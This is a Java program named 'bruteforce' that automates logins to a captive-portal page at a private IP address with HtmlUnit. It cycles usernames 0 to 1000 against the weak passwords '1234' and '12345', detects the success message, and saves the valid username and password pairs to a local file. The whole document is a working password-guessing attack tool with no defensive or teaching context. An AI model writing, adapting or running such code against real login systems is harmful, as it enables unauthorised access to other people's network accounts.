import javax.xml.bind.annotation.XmlElement;

import org.w3c.dom.Document;
import org.w3c.dom.Element;

import com.gargoylesoftware.htmlunit.*;
import com.gargoylesoftware.htmlunit.html.*;
import com.gargoylesoftware.htmlunit.xml.*;

import java.util.logging.*;
import java.util.regex.*; 
import java.awt.Toolkit;

import java.io.*;
public class bruteforce {
	static String logs="";
	/**
	 * @param args
	 * @throws Exception 
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		 Logger.getLogger("com.gargoylesoftware.htmlunit").setLevel(Level.OFF);
		 Logger.getLogger("org.apache.http").setLevel(Level.OFF);
		int start=0,end=1000;
		String[] pwd={"1234","12345"};
		System.out.println("started");
		for(int i=start;i<=end;i++)
		{
			if(i%100==0)
			{
				System.out.println("****"+i+"****");
				updateLogs();
			}
			try
			{
				for(int j=0;j<pwd.length;j++)
				submittingForm(Integer.toString(i),pwd[j]);
			}
			catch(Exception e){System.out.println("failed to check"+i);}
		}
		System.out.println("completed");
		/*
		String shutdownCmd = "shutdown -s";
		try {
			Process child = Runtime.getRuntime().exec(shutdownCmd);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}*/
	}
	static void updateLogs()
	{
		try {
		    //create a temporary file
		    File logFile=new File("C:/Users/Guruprasad BR/Desktop/users.txt");

		    BufferedWriter writer = new BufferedWriter(new FileWriter(logFile));
		    writer.write (logs);

		    //Close writer
		    writer.close();
		} catch(Exception e) {
		    e.printStackTrace();
		}
	}
	public static void submittingForm(String user,String pwd) throws Exception {
	    try (final WebClient webClient = new WebClient(BrowserVersion.CHROME)) {
	        // Get the first page
	        final HtmlPage page1 = webClient.getPage("http://172.16.16.16:8090/httpclient.html");
	        webClient.getOptions().setJavaScriptEnabled(false);
	        // Get the form that we are dealing with and within that form, 
	        // find the submit button and the field that we want to change.
	      //  final HtmlForm form = page1.getFormByName("myform");
	        final HtmlForm form = page1.getFirstByXPath("//form");
         
	        final HtmlTextInput textField = form.getInputByName("username");
	        final HtmlPasswordInput password = form.getInputByName("password");
	        // Change the value of the text field
	        textField.setValueAttribute(user);
	        password.setValueAttribute(pwd);

	        // Now submit the form by clicking the button and get back the second page.
	        final HtmlSubmitInput button = form.getFirstByXPath("/html/body//form//input[@type='submit']");
	        final XmlPage page2 = button.click();
	        Document element = page2.getXmlDocument();
	        Element e=element.getDocumentElement();
            String text = e.getTextContent();
            //System.out.println(pwd);
            String str="LIVEYou have successfully logged inYou have successfully logged off";
            if(Pattern.matches(".*"+str+".*",text))
            {
            	Toolkit.getDefaultToolkit().beep();
            	System.out.println(user+" ok");
            	logs+=user+" "+pwd+" ok \n";
            	updateLogs();
            }
            else
            {
            	//System.out.println(user);
            	//logs+=user+" ";
            }
            //logs+='\n';
	        webClient.closeAllWindows();
	    }
	}

}
